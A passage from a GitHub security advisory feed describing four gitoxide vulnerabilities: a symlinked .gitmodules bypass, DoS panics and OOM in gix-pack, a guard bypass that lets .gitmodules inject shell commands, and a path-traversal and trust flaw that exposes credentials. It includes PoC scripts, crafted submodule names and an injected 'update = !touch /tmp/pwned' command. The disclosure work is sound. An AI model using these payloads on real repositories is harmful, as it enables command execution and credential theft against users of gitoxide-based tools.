<li><a href="https://github.com/GitoxideLabs/gitoxide/blob/v0.52.0/gix/src/repository/submodule.rs"><code>gix/src/repository/submodule.rs</code></a> reads that path with <code>std::fs::read(&amp;path)</code> and immediately parses the bytes as a submodule configuration file.</li>
<li><code>Repository::submodules()</code> exposes the parsed entries through the high-level API.</li>
</ol>
<p>The issue is not in the parser. The issue is that the worktree path is treated as an ordinary file without checking whether it is a symlink, and without checking whether the canonicalized target remains inside the repository worktree.</p>
<p>Because <code>std::fs::read()</code> follows symlinks, a malicious repository can cause gitoxide to ingest bytes from an attacker-chosen location outside the repository. The resulting <code>Submodule</code> objects then expose <code>name</code>, <code>path</code>, and <code>url</code> values derived from that external file.</p>
<h2 id="reproduction-steps">Reproduction steps</h2>
<p>Use the attached PoC zip that contains the <code>pocs/</code> workspace.</p>
<ol>
<li><p>Unzip the PoC archive.</p>
</li>
<li><p>Enter <code>pocs/F001</code>.</p>
</li>
<li><p>Run:</p>
<pre><code class="language-bash">cargo run --quiet
</code></pre>
</li>
<li><p>Compare the output with <code>pocs/F001/result.txt</code>.</p>
</li>
</ol>
<p>Important outputs include:</p>
<ul>
<li><code>gitmodules_symlink=.../victim-repo/.gitmodules</code></li>
<li><code>symlink_target=.../outside/modules.conf</code></li>
<li><code>parsed_name=symlinked</code></li>
<li><code>parsed_path=deps/symlinked</code></li>
<li><code>parsed_url=https://attacker.example/symlinked.git</code></li>
</ul>
<p>These outputs show that gitoxide parsed the submodule configuration from the symlink target outside the repository, not from repository-local bytes.</p>
<h2 id="impact">Impact</h2>
<p>Confirmed impact:</p>
<ul>
<li>out-of-repository bytes can be injected into the result of <code>Repository::submodules()</code>;</li>
<li>callers can be misled about submodule metadata such as <code>name</code>, <code>path</code>, and <code>url</code>;</li>
<li>any downstream workflow that uses those values to decide clone, fetch, update, or policy behavior is operating on attacker-controlled data that did not actually originate from the repository tree.</li>
</ul>
<p>This report does <strong>not</strong> claim direct command execution from this code path by itself. The demonstrated impact is metadata injection across the repository boundary.</p>
<h2 id="recommended-fix">Recommended fix</h2>
<p>A safe fix is to stop silently following symlinks for the worktree <code>.gitmodules</code> path in this loading path.</p>
<p>Reasonable options include:</p>
<ol>
<li>use <code>symlink_metadata()</code> / <code>lstat</code>style checks and reject symlinked <code>.gitmodules</code> when loading from the worktree;</li>
<li>canonicalize the target and verify that it still resides under the repository worktree before reading it;</li>
<li>for security-sensitive callers, prefer loading <code>.gitmodules</code> from the index or <code>HEAD</code> tree rather than following the worktree path.</li>
</ol>
<p>At minimum, the worktree path should not silently follow symlinks to arbitrary external files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-pg4w-g64p-qwhj">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-pg4w-g64p-qwhj</a></li>
<li><a href="https://github.com/advisories/GHSA-pg4w-g64p-qwhj">https://github.com/advisories/GHSA-pg4w-g64p-qwhj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pg4w-g64p-qwhj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T19:26:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix-pack] gix-pack has multiple DoS vectors: unchecked indexing panics and uncapped OOM allocations from crafted pack data]]></title>
        <id>https://github.com/advisories/GHSA-x494-mj8g-cj27</id>
        <link href="https://github.com/advisories/GHSA-x494-mj8g-cj27"/>
        <updated>2026-05-05T19:24:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Multiple denial-of-service vectors in <code>gix-pack</code>: unchecked array indexing causes panics on crafted delta data, and uncapped attacker-controlled size headers enable OOM process kills. Both are triggered by malicious pack data received during clone/fetch.</p>
<h3 id="details">Details</h3>
<p><strong>Bug 1: Unchecked array indexing in delta application (CWE-248)</strong></p>
<p>The <code>apply()</code> function in <code>gix-pack/src/data/delta.rs</code> (lines 33-87) reads delta instructions using unchecked <code>data[i]</code> indexing at 7 locations (lines 41, 45, 49, 53, 57, 61, 65). The command byte's bits indicate how many additional bytes follow, but if the delta data is truncated, the index panics:</p>
<pre><code class="language-rust">pub(crate) fn apply(base: &amp;[u8], mut target: &amp;mut [u8], data: &amp;[u8]) -&gt; Result&lt;(), apply::Error&gt; {
    let mut i = 0;
    while let Some(cmd) = data.get(i) {  // first byte: safely checked
        i += 1;
        match cmd {
            cmd if cmd &amp; 0b1000_0000 != 0 =&gt; {
                let (mut ofs, mut size): (u32, u32) = (0, 0);
                if cmd &amp; 0b0000_0001 != 0 {
                    ofs = u32::from(data[i]);     // PANIC: no bounds check
                    i += 1;
                }
                // ... 6 more unchecked data[i] at lines 45, 49, 53, 57, 61, 65
</code></pre>
<p>Lines 83-84 use <code>assert_eq!</code> (not <code>debug_assert_eq!</code>) that panics in both debug and release builds:</p>
<pre><code class="language-rust">    assert_eq!(i, data.len());
    assert_eq!(target.len(), 0);
</code></pre>
<p>A second location in <code>parse_header_info()</code> (<code>gix-pack/src/data/entry/decode.rs:116-129</code>) also panics on truncated input via unchecked <code>data[0]</code> and <code>data[i]</code>.</p>
<p>Note: PR #2059 (merged 2025-06-25) fixed the explicit <code>panic!()</code> for command code 0. The unchecked array indexing is a distinct class that remains unfixed.</p>
<p><strong>Bug 2: Uncapped allocation from attacker-controlled size headers (CWE-770)</strong></p>
<p>Pack entry headers and delta headers encode object sizes as LEB128-encoded u64 values. These sizes are used to allocate buffers before validating the actual data, with no upper bound:</p>
<pre><code>bytes_to_entries.rs:109  Vec::with_capacity(entry.decompressed_size as usize)  // UNCAPPED
resolve.rs:461           out.resize(decompressed_len, 0)                       // UNCAPPED
resolve.rs:190           fully_resolved_delta_bytes.resize(result_size as usize, 0)  // UNCAPPED
</code></pre>
<p>A 10-byte crafted pack entry can claim <code>decompressed_size = 0xFFFFFFFFFFFF</code> (281 TB). At <code>bytes_to_entries.rs:109</code>, gitoxide calls <code>Vec::with_capacity(281TB)</code> <strong>before any decompression occurs</strong>. The OS immediately OOM-kills the process. No <code>MAX_SIZE</code>, <code>max_object_size</code>, or equivalent limit exists anywhere in gix-pack.</p>
<p>The allocation at <code>resolve.rs:461</code> is equally dangerous: <code>decompressed_size</code> from the pack header is cast to <code>usize</code> and passed to <code>Vec::resize()</code>, which allocates and zeroes the full claimed size before the zlib decompressor runs.</p>
<h3 id="poc">PoC</h3>
<p>Compiled and executed in Rust 1.94.1 <code>--release</code> mode. All 5 panics confirmed:</p>
<pre><code>[1] delta apply: cmd=0x81, truncated -&gt; PANIC: index out of bounds: len is 1 but index is 1
[2] delta apply: cmd=0xFF, only 3 extra bytes -&gt; PANIC: index out of bounds: len is 4 but index is 4
[3] parse_header_info: empty data -&gt; PANIC: index out of bounds: len is 0 but index is 0
[4] parse_header_info: byte=0x80, truncated -&gt; PANIC: index out of bounds: len is 1 but index is 1
[5] delta apply: assert_eq!(i, data.len()) -&gt; PANIC: assertion failed
</code></pre>
<p>For the OOM vector: the allocation path is <code>parse_header_info()</code> -&gt; <code>entry.decompressed_size</code> (u64) -&gt; <code>Vec::with_capacity(size as usize)</code> with no intermediate validation. A minimal pack with a single entry claiming a multi-terabyte size triggers immediate process kill.</p>
<h3 id="impact">Impact</h3>
<p>Any application built on gitoxide that clones or fetches from an untrusted remote can be crashed by a malicious server:</p>
<ul>
<li><strong>Panic DoS</strong>: 1-2 bytes of crafted delta data causes an immediate process abort</li>
<li><strong>OOM DoS</strong>: A single crafted pack entry header causes the process to attempt a multi-terabyte allocation, triggering an immediate OOM kill by the OS</li>
</ul>
<p>This affects the <code>gix</code> CLI, any application using the <code>gix</code> crate, and CI/CD systems that clone repositories using gitoxide. No fuzz targets exist for gix-pack (issue #703 tracks oss-fuzz integration).</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>For panics: replace unchecked <code>data[i]</code> with <code>data.get(i).ok_or(Error::...)</code> and replace <code>assert_eq!</code> with proper error returns.</p>
<p>For OOM: add a configurable maximum object size (similar to git's <code>transfer.maxPackSize</code>) and validate claimed sizes against it before allocating. At minimum, cap allocations to a reasonable default (e.g., 4 GB) and use <code>try_reserve()</code> consistently.</p>
<h3 id="severity">Severity</h3>
<p>High. Network vector, no privileges required, user interaction required (clone/fetch). The OOM vector is a single-packet process kill with no recovery.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-x494-mj8g-cj27">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-x494-mj8g-cj27</a></li>
<li><a href="https://github.com/advisories/GHSA-x494-mj8g-cj27">https://github.com/advisories/GHSA-x494-mj8g-cj27</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x494-mj8g-cj27</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T19:24:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix] gitoxide: CommandForbiddenInModulesConfiguration Bypass in gix_submodule::File::update() Enables Arbitrary Command Execution via .gitmodules]]></title>
        <id>https://github.com/advisories/GHSA-f26g-jm89-4g65</id>
        <link href="https://github.com/advisories/GHSA-f26g-jm89-4g65"/>
        <updated>2026-05-05T19:23:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><a href="https://github.com/GitoxideLabs/gitoxide/blob/main/gix-submodule/src/access.rs#L168"><code>gix_submodule::File::update()</code></a> is the API that gates whether an attacker-supplied <code>.gitmodules</code> file may set <code>update = !&lt;shell command&gt;</code>. The function is designed to return <code>Err(CommandForbiddenInModulesConfiguration)</code> unless the <code>!command</code> value came from a trusted local source (<code>.git/config</code>). Git CVE <a href="https://nvd.nist.gov/vuln/detail/cve-2019-19604">CVE-2019-19604</a> illustrates why this check is necessary.</p>
<p>However, the guard is implemented incorrectly: it checks whether any section with the same submodule name exists from a non-<code>.gitmodules</code> source; it does not verify that the <code>update</code> value came from that section.</p>
<p>Once a submodule has been initialized (any workflow that writes <code>submodule.&lt;name&gt;.url</code> to <code>.git/config</code>), and the attacker subsequently adds <code>update = !cmd</code> to <code>.gitmodules</code>, the guard passes while the command value falls through to the attacker-controlled file.</p>
<p>On an identical repository state, <code>git submodule update</code> aborts with <code>fatal: invalid value for 'submodule.sub.update'</code>, while <code>gix::Submodule::update()</code> returns <code>Ok(Some(Update::Command("touch /tmp/pwned")))</code>.</p>
<p>The vulnerable code was introduced in <a href="https://github.com/GitoxideLabs/gitoxide/commit/6a2e6a436f76c8bbf2487f9967413a51356667a0">https://github.com/GitoxideLabs/gitoxide/commit/6a2e6a436f76c8bbf2487f9967413a51356667a0</a>.</p>
<h3 id="details">Details</h3>
<p>The vulnerable method is <code>gix_submodule::File::update</code>: <a href="https://github.com/GitoxideLabs/gitoxide/blob/main/gix-submodule/src/access.rs#L168-L193">https://github.com/GitoxideLabs/gitoxide/blob/main/gix-submodule/src/access.rs#L168-L193</a>:</p>
<pre><code class="language-rust">pub fn update(&amp;self, name: &amp;BStr) -&gt; Result&lt;Option&lt;Update&gt;, config::update::Error&gt; {
    let value: Update = match self.config.string(format!("submodule.{name}.update")) {
        //                    ^^^^^^^^^^^^^^^^^^
        //  [A] Reads the value. gix_config::File::string() iterates sections
        //      newest-to-oldest; if the override section lacks `update`, it
        //      falls through to .gitmodules and returns the attacker value.
        //
        // https://github.com/GitoxideLabs/gitoxide/blob/main/gix-config/src/file/access/raw.rs#L76
        Some(v) =&gt; v.as_ref().try_into().map_err(|()| config::update::Error::Invalid {
            submodule: name.to_owned(),
            actual: v.into_owned(),
        })?,
        None =&gt; return Ok(None),
    };

    if let Update::Command(cmd) = &amp;value {
        let ours = self.config.meta();
        let has_value_from_foreign_section = self
            .config
            .sections_by_name("submodule")
            .into_iter()
            .flatten()
            .any(|s| s.header().subsection_name() == Some(name) &amp;&amp; !std::ptr::eq(s.meta(), ours));
            //  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
            //  [B] Checks only that SOME section with this name exists from a
            //      non-.gitmodules source. Does NOT check where [A]'s value
            //      came from.
        if !has_value_from_foreign_section {
            return Err(config::update::Error::CommandForbiddenInModulesConfiguration { ... });
        }
    }
    Ok(Some(value))
}
</code></pre>
<h3 id="poc">PoC</h3>
<p><code>git submodule init</code> copies <code>submodule.$name.url</code> and writes <code>active = true</code> into <code>.git/config</code> (<a href="https://github.com/git/git/blob/v2.53.0/builtin/submodule--helper.c#L438-L517"><code>init_submodule()</code>, builtin/submodule--helper.c:438-517</a>). It does not unconditionally copy <code>update</code>.</p>
<p>Since CVE-2019-19604, <code>git</code> rejects <code>.gitmodules</code> files that contain <code>update = !cmd</code> at parse time. However, <code>init</code> is a one-time operation - once the <code>.git/config</code> section exists, subsequent changes to <code>.gitmodules</code> are not re-inited.</p>
<p>So, the attack sequence is:</p>
<ol>
<li>Attacker's repo ships a benign <code>.gitmodules</code> (no <code>update</code> key).</li>
<li>Victim clones and runs <code>git submodule init</code> -&gt; <code>.git/config</code> contains:<pre><code class="language-ini">[submodule "sub"]
    active = true
    url = /tmp/sub-origin
</code></pre>
</li>
<li>Attacker pushes a new commit adding <code>update = !cmd</code> to <code>.gitmodules</code>.</li>
<li>Victim runs <code>git pull</code> -&gt; <code>.gitmodules</code> now contains:<pre><code class="language-ini">[submodule "sub"]
    path = sub
    url = /tmp/sub-origin
    update = !touch /tmp/pwned
</code></pre>
while <code>.git/config</code> is unchanged.</li>
</ol>
<p>This is the precise state that bypasses gitoxide's guard:</p>
<ul>
<li>The .git/config entry - even though it contains only url and active - causes <a href="https://github.com/GitoxideLabs/gitoxide/blob/dd5c18d9e526e8de462fa40aa047acd097cfa7dc/gix-submodule/src/lib.rs#L41"><code>append_submodule_overrides</code></a> to create an override section. That section has foreign (non-.gitmodules) metadata, so the existence check at [B] returns true and the guard is disarmed.</li>
<li>However, because that override section has no update key, the value lookup at [A] skips past it and falls through to the .gitmodules section, returning the attacker's !touch /tmp/pwned.</li>
</ul>
<p>The bug is the mismatch between what [A] and [B] actually inspect: [A] asks "which section provides the update value?" (answer: .gitmodules), while [B] asks "does any trusted section exist for this submodule?" (answer: yes). A correct guard would ask the same question as [A].</p>
<p>Git itself would refuse to operate on this repository at the next <code>git submodule update</code>. The vulnerability is in gitoxide-based consumers that call <code>Submodule::update()</code> and trust its output.</p>
<h3 id="option-1-unit-test-verified---passes-confirming-the-bug">Option 1: Unit test (verified - passes, confirming the bug)</h3>
<p>Drop into <code>gix-submodule/tests/file/mod.rs</code> inside <code>mod update</code>:</p>
<pre><code class="language-rust">#[test]
fn security_bypass_via_partial_override() {
    use std::str::FromStr;

    // Attacker-controlled .gitmodules
    let gitmodules =
        "[submodule.a]\n url = https://example.com/a\n update = !touch /tmp/pwned";

    // Post-`git submodule init` state: only `url` copied to .git/config
    let repo_config =
        gix_config::File::from_str("[submodule.a]\n url = https://example.com/a").unwrap();

    let module =
        gix_submodule::File::from_bytes(gitmodules.as_bytes(), None, &amp;repo_config).unwrap();

    let result = module.update("a".into());
    // VULNERABLE: prints `Ok(Some(Command("touch /tmp/pwned")))`
    // SECURE:     should be `Err(CommandForbiddenInModulesConfiguration { .. })`
    eprintln!("{:?}", result);
}
</code></pre>
<pre><code class="language-console">$ cargo test -p gix-submodule security_bypass -- --nocapture
running 1 test
bypass result: Ok(Some(Command("touch /tmp/pwned")))
test file::update::security_bypass_via_partial_override ... ok
</code></pre>
<h3 id="option-2-end-to-end---git-refuses-gitoxide-accepts">Option 2: End-to-end - git refuses, gitoxide accepts</h3>
<p>Verified with <strong>git 2.51.2</strong> and <strong>gix @ <code>dd5c18d9e</code></strong>.</p>
<pre><code class="language-bash">#!/bin/bash
set -e
cd /tmp
rm -rf evil-repo victim sub-origin 2&gt;/dev/null || true

# --- Setup ---
mkdir sub-origin &amp;&amp; cd sub-origin
git init -q &amp;&amp; git commit -q --allow-empty -m init
cd /tmp

# --- [1] Attacker creates repo with BENIGN submodule ---
mkdir evil-repo &amp;&amp; cd evil-repo
git init -q
git -c protocol.file.allow=always submodule add /tmp/sub-origin sub
git commit -q -m "add submodule (benign)"
cd /tmp

# --- [2] Victim clones and inits (passes git's .gitmodules validation) ---
git -c protocol.file.allow=always clone -q /tmp/evil-repo victim
cd victim
git submodule init
# .git/config now has: [submodule "sub"] active=true, url=..., NO update key
cd /tmp

# --- [3] Attacker adds malicious update to .gitmodules ---
cd evil-repo
cat &gt;&gt; .gitmodules &lt;&lt;'EOF'
    update = !touch /tmp/pwned
EOF
git commit -q -am "add malicious update"
cd /tmp

# --- [4] Victim pulls ---
cd victim
git pull -q
</code></pre>
<p>Final state:</p>
<pre><code>--- .gitmodules:
[submodule "sub"]
        path = sub
        url = /tmp/sub-origin
        update = !touch /tmp/pwned
--- .git/config (submodule section):
[submodule "sub"]
        active = true
        url = /tmp/sub-origin
</code></pre>
<p><strong>Upstream git on this state:</strong></p>
<pre><code class="language-console">$ cd /tmp/victim &amp;&amp; git submodule update
fatal: invalid value for 'submodule.sub.update'
$ echo $?
128
$ test -f /tmp/pwned &amp;&amp; echo VULNERABLE || echo SAFE
SAFE
</code></pre>
<p><strong>Gitoxide on the same state:</strong></p>
<pre><code class="language-rust">// /tmp/gix-repro/main.rs
let repo = gix::open("/tmp/victim")?;
for sm in repo.submodules()?.expect("submodules present") {
    println!("{}: {:?}", sm.name(), sm.update());
}
</code></pre>
<pre><code class="language-console">$ cargo run
sub: Ok(Some(Command("touch /tmp/pwned")))
</code></pre>
<p>The <code>CommandForbiddenInModulesConfiguration</code> guard never fires.</p>
<h3 id="impact">Impact</h3>
<h3 id="direct">Direct</h3>
<p>Any downstream code built on <code>gix</code> that:</p>
<ol>
<li>Calls <code>Submodule::update()</code> to determine the update strategy, and</li>
<li>Trusts that <code>Update::Command(_)</code> is safe to execute (because <code>CommandForbiddenInModulesConfiguration</code> exists as the documented guard)</li>
</ol>
<p>…will execute attacker-controlled shell commands on <code>submodule update</code> against a previously-initialized submodule.</p>
<p><code>gix</code> itself does not currently ship a <code>submodule update</code> implementation, so there is no RCE in the <code>gix</code> CLI today. However:</p>
<ul>
<li>The <code>Submodule::update()</code> API is public at <code>gix/src/submodule/mod.rs:108</code> and delegates directly to the vulnerable function.</li>
<li>The error variant name (<code>CommandForbiddenInModulesConfiguration</code>) and test suite (<code>valid_in_overrides</code> at <code>gix-submodule/tests/file/mod.rs:272</code>) explicitly document this as the security boundary.</li>
<li>Any third-party tool, IDE plugin, or CI integration building submodule-update on top of <code>gix</code> inherits this vulnerability.</li>
</ul>
<h3 id="indirect--second-order">Indirect / second-order</h3>
<ul>
<li>CI/forge integrations that auto-init submodules and then query the update mode</li>
<li>Editor/IDE extensions using <code>gix</code> for submodule info</li>
<li>Gitoxide-based <code>init</code> equivalents - any tool that implements its own init (writing <code>url</code> to local config) creates the bypass state without needing the pull-after-init sequence</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-f26g-jm89-4g65">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-f26g-jm89-4g65</a></li>
<li><a href="https://github.com/advisories/GHSA-f26g-jm89-4g65">https://github.com/advisories/GHSA-f26g-jm89-4g65</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f26g-jm89-4g65</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T19:23:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix-validate] gix's submodule name validation bypass + trust inheritance flaw enables path traversal and credential disclosure]]></title>
        <id>https://github.com/advisories/GHSA-p3hw-mv63-rf9w</id>
        <link href="https://github.com/advisories/GHSA-p3hw-mv63-rf9w"/>
        <updated>2026-05-05T19:20:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Submodule name validation bypass plus missing validation in production code paths allows path traversal via crafted <code>.gitmodules</code>. Combined with a trust inheritance flaw in <code>Submodule::open()</code>, this enables reading arbitrary git repository configs (including credentials) from traversed paths with full trust (CWE-22, CWE-200).</p>
<h3 id="details">Details</h3>
<p><strong>Bug 1: Validation bypass in <code>gix-validate/src/submodule.rs</code> (lines 27-42)</strong></p>
<p>The <code>name()</code> function uses <code>name.find(b"..")</code> which returns only the FIRST occurrence. If the first <code>..</code> is embedded in a non-traversal context, the function returns <code>Ok</code> without checking subsequent <code>../</code> sequences:</p>
<pre><code class="language-rust">pub fn name(name: &amp;BStr) -&gt; Result&lt;&amp;BStr, name::Error&gt; {
    match name.find(b"..") {
        Some(pos) =&gt; {
            let &amp;b = name.get(pos + 2).ok_or(name::Error::ParentComponent)?;
            if b == b'/' || b == b'\\' {
                Err(name::Error::ParentComponent)
            } else {
                Ok(name)  // Returns Ok without checking rest of string
            }
        }
        None =&gt; Ok(name),
    }
}
</code></pre>
<p>Bypass: <code>a..b/../../../.git/</code> passes because <code>find(b"..")</code> returns position 1 (the <code>..</code> in <code>a..b</code>), checks <code>name[3] == b'b'</code>, and returns Ok. The real <code>/../../../</code> is never checked.</p>
<p><strong>Bug 2: Validation never called in production</strong></p>
<p><code>gix_validate::submodule::name()</code> has zero production callers (only test code). The <code>names()</code> iterator in <code>gix-submodule/src/access.rs:29</code> explicitly documents it returns "unvalidated names."</p>
<p><code>git_dir()</code> at <code>gix/src/submodule/mod.rs:198-204</code> constructs filesystem paths from raw names:</p>
<pre><code class="language-rust">pub fn git_dir(&amp;self) -&gt; PathBuf {
    self.state.repo.common_dir().join("modules").join(gix_path::from_bstr(self.name()))
}
</code></pre>
<p><strong>Bug 3: Trust inheritance bypass in <code>Submodule::open()</code></strong></p>
<p>At <code>gix/src/submodule/mod.rs:270</code>, <code>open()</code> clones the parent repository's options:</p>
<pre><code class="language-rust">match crate::open_opts(self.git_dir_try_old_form()?, self.state.repo.options.clone()) {
</code></pre>
<p>The parent's <code>options.git_dir_trust</code> is <code>Some(Trust::Full)</code>. At <code>gix/src/open/repository.rs:103-104</code>:</p>
<pre><code class="language-rust">if options.git_dir_trust.is_none() {
    options.git_dir_trust = gix_sec::Trust::from_path_ownership(&amp;git_dir)?.into();
}
</code></pre>
<p>Since trust is already <code>Some(Full)</code>, the ownership check is <strong>skipped entirely</strong>. The traversed path is opened with <code>Trust::Full</code> regardless of ownership, bypassing gitoxide's safe-directory protections.</p>
<h3 id="poc">PoC</h3>
<p>Compiled and executed in Rust 1.94.1 <code>--release</code> mode. All bypass cases confirmed:</p>
<pre><code>BYPASS a..b/../../../.git/           -&gt; PASSED validation
       git_dir = .git/modules/a..b/../../../.git/
       normalized = .git/              (parent repo!)

BYPASS x..y/../../../.git/config     -&gt; PASSED validation
       git_dir = .git/modules/x..y/../../../.git/config
       normalized = .git/config
</code></pre>
<h3 id="attack-chain">Attack chain</h3>
<ol>
<li><p>Attacker crafts a repository with <code>.gitmodules</code>:</p>
<pre><code class="language-ini">[submodule "x..y/../../.."]
    path = innocent
    url = https://attacker.com/repo.git
</code></pre>
</li>
<li><p>Victim clones the repository using a tool built on gitoxide.</p>
</li>
<li><p>When the tool iterates submodules and calls <code>submodule.open()</code> or <code>submodule.status()</code>:</p>
<ul>
<li><code>git_dir()</code> returns <code>.git/modules/x..y/../../..</code> which resolves to the parent <code>.git/</code></li>
<li><code>open_opts()</code> is called with <code>Trust::Full</code> (inherited from parent, ownership check skipped)</li>
<li>The parent's <code>.git/config</code> is fully parsed</li>
</ul>
</li>
<li><p>The returned <code>Repository</code> object exposes all config values from the traversed path:</p>
<ul>
<li><code>remote.origin.url</code> (may contain <code>https://user:token@github.com/...</code>)</li>
<li><code>http.extraHeader</code> (often <code>Authorization: Bearer &lt;token&gt;</code>)</li>
<li><code>credential.*</code> sections</li>
<li><code>core.sshCommand</code></li>
</ul>
</li>
<li><p>Accessible via standard API: <code>repo.config_snapshot().string("http.extraHeader")</code>, <code>repo.find_remote("origin")</code>, etc.</p>
</li>
</ol>
<h3 id="impact">Impact</h3>
<p>A crafted <code>.gitmodules</code> in a malicious repository causes gitoxide to open arbitrary git directories as submodule repositories with full trust, exposing their configuration including credentials. This is the same class of vulnerability as GHSA-7w47-3wg8-547c (path traversal), but through the submodule name vector with an additional trust bypass.</p>
<p>The trust inheritance is the critical amplifier: without it, the traversed path would undergo ownership checks that could block the attack. With it, any git directory reachable via <code>../</code> is opened with full trust.</p>
<h3 id="honest-limitations">Honest limitations</h3>
<ul>
<li>The traversed path must be a valid git directory (HEAD, objects/, refs/ must exist)</li>
<li>The victim's tool must call <code>open()</code> or <code>status()</code> on submodules (tools that only list submodules are not affected)</li>
<li>Credential exposure requires the target config to contain embedded credentials</li>
<li>Submodule operations currently require explicit user action</li>
</ul>
<h3 id="suggested-fix">Suggested fix</h3>
<ol>
<li>Fix the validation to check ALL <code>..</code> occurrences (iterate, not single <code>find</code>)</li>
<li>Call <code>gix_validate::submodule::name()</code> in <code>git_dir()</code> before constructing the path</li>
<li>Do NOT inherit <code>git_dir_trust</code> from parent when opening submodule repos -- always re-derive trust from path ownership</li>
</ol>
<h3 id="severity">Severity</h3>
<p>High. Network vector (via clone), requires user interaction (submodule operations). The trust bypass enables credential disclosure from traversed git directories. Confidentiality impact is high.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-p3hw-mv63-rf9w">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-p3hw-mv63-rf9w</a></li>
<li><a href="https://github.com/advisories/GHSA-p3hw-mv63-rf9w">https://github.com/advisories/GHSA-p3hw-mv63-rf9w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p3hw-mv63-rf9w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T19:20:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix] gix's submodule name validation bypass + trust inheritance flaw enables path traversal and credential disclosure]]></title>
        <id>https://github.com/advisories/GHSA-p3hw-mv63-rf9w</id>
        <link href="https://github.com/advisories/GHSA-p3hw-mv63-rf9w"/>
        <updated>2026-05-05T19:20:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Submodule name validation bypass plus missing validation in production code paths allows path traversal via crafted <code>.gitmodules</code>. Combined with a trust inheritance flaw in <code>Submodule::open()</code>, this enables reading arbitrary git repository configs (including credentials) from traversed paths with full trust (CWE-22, CWE-200).</p>
<h3 id="details">Details</h3>
<p><strong>Bug 1: Validation bypass in <code>gix-validate/src/submodule.rs</code> (lines 27-42)</strong></p>
<p>The <code>name()</code> function uses <code>name.find(b"..")</code> which returns only the FIRST occurrence. If the first <code>..</code> is embedded in a non-traversal context, the function returns <code>Ok</code> without checking subsequent <code>../</code> sequences:</p>
<pre><code class="language-rust">pub fn name(name: &amp;BStr) -&gt; Result&lt;&amp;BStr, name::Error&gt; {
    match name.find(b"..") {
        Some(pos) =&gt; {
            let &amp;b = name.get(pos + 2).ok_or(name::Error::ParentComponent)?;
            if b == b'/' || b == b'\\' {
                Err(name::Error::ParentComponent)
            } else {
                Ok(name)  // Returns Ok without checking rest of string
            }
        }
        None =&gt; Ok(name),
    }
}
</code></pre>
<p>Bypass: <code>a..b/../../../.git/</code> passes because <code>find(b"..")</code> returns position 1 (the <code>..</code> in <code>a..b</code>), checks <code>name[3] == b'b'</code>, and returns Ok. The real <code>/../../../</code> is never checked.</p>
<p><strong>Bug 2: Validation never called in production</strong></p>
<p><code>gix_validate::submodule::name()</code> has zero production callers (only test code). The <code>names()</code> iterator in <code>gix-submodule/src/access.rs:29</code> explicitly documents it returns "unvalidated names."</p>
<p><code>git_dir()</code> at <code>gix/src/submodule/mod.rs:198-204</code> constructs filesystem paths from raw names:</p>
<pre><code class="language-rust">pub fn git_dir(&amp;self) -&gt; PathBuf {
    self.state.repo.common_dir().join("modules").join(gix_path::from_bstr(self.name()))
}
</code></pre>
<p><strong>Bug 3: Trust inheritance bypass in <code>Submodule::open()</code></strong></p>
<p>At <code>gix/src/submodule/mod.rs:270</code>, <code>open()</code> clones the parent repository's options:</p>
<pre><code class="language-rust">match crate::open_opts(self.git_dir_try_old_form()?, self.state.repo.options.clone()) {
</code></pre>
<p>The parent's <code>options.git_dir_trust</code> is <code>Some(Trust::Full)</code>. At <code>gix/src/open/repository.rs:103-104</code>:</p>
<pre><code class="language-rust">if options.git_dir_trust.is_none() {
    options.git_dir_trust = gix_sec::Trust::from_path_ownership(&amp;git_dir)?.into();
}
</code></pre>
<p>Since trust is already <code>Some(Full)</code>, the ownership check is <strong>skipped entirely</strong>. The traversed path is opened with <code>Trust::Full</code> regardless of ownership, bypassing gitoxide's safe-directory protections.</p>
<h3 id="poc">PoC</h3>
<p>Compiled and executed in Rust 1.94.1 <code>--release</code> mode. All bypass cases confirmed:</p>
<pre><code>BYPASS a..b/../../../.git/           -&gt; PASSED validation
       git_dir = .git/modules/a..b/../../../.git/
       normalized = .git/              (parent repo!)

BYPASS x..y/../../../.git/config     -&gt; PASSED validation
       git_dir = .git/modules/x..y/../../../.git/config
       normalized = .git/config
</code></pre>
<h3 id="attack-chain">Attack chain</h3>
<ol>
<li><p>Attacker crafts a repository with <code>.gitmodules</code>:</p>
<pre><code class="language-ini">[submodule "x..y/../../.."]
    path = innocent
    url = https://attacker.com/repo.git
</code></pre>
</li>
